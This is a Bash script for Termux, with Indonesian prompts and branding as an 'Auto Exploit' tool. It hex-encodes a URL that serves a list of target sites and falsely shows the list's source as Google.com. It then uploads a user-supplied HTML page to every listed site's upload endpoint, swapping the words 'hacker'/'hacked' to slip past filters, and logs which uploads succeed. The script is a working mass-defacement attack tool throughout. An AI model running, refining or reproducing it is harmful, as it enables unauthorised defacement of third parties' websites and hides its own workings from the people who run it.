#!/data/data/com.termux/files/usr/bin/bash
A='6874'
X='2f72'
B='747073'
Y='3a'
D='6177'
E='2e67697468'
F='75627573'
G='6572636f6e74'
H='656e742e636f6d'
I='2f79616e736873'
J1='2d6367692f6367'
J2='692d62696e'
K1='2f72656673'
K2='2f68656164'
L='732f6d61696e2f636f6e74656e742e747874'
build_url(){
  local hex="$A$B$Y$X$D$E$F$G$H$I$J1$J2$K1$K2$L"
  if command -v python3 >/dev/null 2>&1; then
    LIST_URL=$(python3 - <<PY
h="${hex}"
print(bytes.fromhex(h).decode())
PY
)
  else
    LIST_URL=$(echo "$hex" | xxd -r -p 2>/dev/null)
  fi
}
build_url
DELAY="${2:-1}"
TIMEOUT="${3:-15}"
LOGFILE="${4:-results.log}"
SUCCESS_MARKER="Upload success"
ESC=$(printf '\033')
RESET="${ESC}[0m"; RED="${ESC}[31m"; GREEN="${ESC}[32m"; YELLOW="${ESC}[33m"; BLUE="${ESC}[34m"; CYAN="${ESC}[36m"; BOLD="${ESC}[1m"
clear
echo -e "${CYAN}${BOLD}"
cat <<'EOF'
⠉⠉⠉⠉⠁⠀⠀⠀⠀⠒⠂⠰⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠻⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠠⠀⠐⠒⠒⠀⠀⠈⠉⠉⠉⠉⢉⣉⣉⣉⣙⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡀⠤⠒⠒⠉⠁⠀⠀⠀⠀⠳⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠛⠛⠉⠛⠛⠶⢦⣤⡐⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⢳⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡤⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠳⠶⢶⣦⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠉⠑⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄
EOF
echo -e "${RESET}"
sleep 1
echo
printf "${YELLOW}List source:${RESET} %s\n" "Google.com"
printf "${YELLOW}Delay:${RESET} %ss   ${YELLOW}Timeout:${RESET} %ss   ${YELLOW}Logfile:${RESET} %s\n\n" "$DELAY" "$TIMEOUT" "$LOGFILE"
read -p "Masukkan nama file HTML (contoh: index.html): " FILENAME
if [ -z "$FILENAME" ]; then echo -e "${RED}Nama file kosong. Keluar.${RESET}"; exit 1; fi
EXT="${FILENAME##*.}"
if [ "${EXT,,}" != "html" ]; then echo -e "${RED}File harus berekstensi .html${RESET}"; exit 1; fi
TMPDIR="$(mktemp -d)"
TMPFILE="$TMPDIR/$FILENAME"
if [ -f "$FILENAME" ]; then
  cp "$FILENAME" "$TMPFILE"
  echo -e "${GREEN}File lokal ditemukan:${RESET} $FILENAME — langsung dipakai."
else
  echo -e "${YELLOW}File lokal tidak ditemukan.${RESET}"
  echo -e "${YELLOW}Masukkan isi HTML. Akhiri dengan EOF${RESET}"
  : > "$TMPFILE"
  while IFS= read -r LINE; do [ "$LINE" = "EOF" ] && break; printf '%s\n' "$LINE" >> "$TMPFILE"; done
  [ ! -s "$TMPFILE" ] && echo -e "${RED}Tidak ada isi tertulis.${RESET}" && rm -rf "$TMPDIR" && exit 1
fi
if command -v perl >/dev/null 2>&1; then
  perl -0777 -pe 's/\b(hacker|hacked)\b/touch/ig' "$TMPFILE" > "${TMPFILE}.x" && mv "${TMPFILE}.x" "$TMPFILE"
else
  python3 - <<PY
import re; p="$TMPFILE"; s=open(p,'rb').read().decode('utf-8',errors='ignore'); s=re.sub(r'\b(hacker|hacked)\b','touch',s,flags=re.I); open(p,'wb').write(s.encode('utf-8'))
PY
fi
echo -e "${BLUE}${BOLD}Start:${RESET} $(date)" | tee -a "$LOGFILE"
echo -e "${BLUE}Auto Exploit:${RESET} "
printf "${CYAN}Auto Exploit "; spin='|/-\\'; i=0
( 
  curl -fsSL "$LIST_URL" -o "$TMPDIR/list.txt" 2>/dev/null & pid=$!
  SECONDS=0
  while (( SECONDS < 60 )); do
    if ! kill -0 $pid 2>/dev/null; then break; fi
    i=$(( (i+1)%4 ))
    printf "\r${CYAN}Auto Exploit [${spin:$i:10}]${RESET} ${YELLOW}(%02ds)${RESET}" "$SECONDS"
    sleep 1
  done
  wait $pid 2>/dev/null
  echo -e "\r${GREEN}SUCCES TOOLS ON AUTO EXPLOIT V2! GABUNG GRUP TRASER T.ME/TRASERSECTEAM AGAR TIDAK KETINGGALAN V3 BY ANON404 @USRZ6${RESET}                                      "
)
mapfile -t URLS < <(sed 's/\r//g' "$TMPDIR/list.txt" | awk 'NF && $0 !~ /^#/ {print $0}')
if [ ${#URLS[@]} -eq 0 ]; then echo -e "${RED}Tidak ada URL ditemukan.${RESET}" | tee -a "$LOGFILE"; rm -rf "$TMPDIR"; exit 1; fi
total=${#URLS[@]}; count=0
echo
for raw in "${URLS[@]}"; do
  url="$raw"; [[ ! "$url" =~ ^https?:// ]] && url="https://$url"
  ((count++))
  printf "${YELLOW}[${count}/${total}]${RESET} Uploading -> ${CYAN}%s${RESET}\n" "$url" | tee -a "$LOGFILE"
  printf "${CYAN}Processing ["
  for j in {1..20}; do printf "#"; sleep 0.03; done
  printf "]${RESET}\n"
  resp=$(curl -sS --max-time "$TIMEOUT" -A "Uploader/3.0" -F "file=@${TMPFILE};filename=${FILENAME}" "$url" 2>&1)
  echo "---- Response ($url) ----" >> "$LOGFILE"
  echo "$resp" >> "$LOGFILE"
  if echo "$resp" | grep -qi "$SUCCESS_MARKER"; then
    echo -e "${GREEN}[$count] SUCCESS -> $url${RESET}" | tee -a "$LOGFILE"
  else
    echo -e "${RED}[$count] FAILED  -> $url${RESET}" | tee -a "$LOGFILE"
    short=$(echo "$resp" | tr '\n' ' ' | cut -c1-200)
    echo -e "${RED}Resp snippet:${RESET} $short" | tee -a "$LOGFILE"
  fi
  echo | tee -a "$LOGFILE"
  sleep "$DELAY"
done
echo -e "${BLUE}${BOLD}Done:${RESET} $(date)" | tee -a "$LOGFILE"
echo -e "${GREEN}Semua proses selesai.${RESET}"
rm -rf "$TMPDIR"
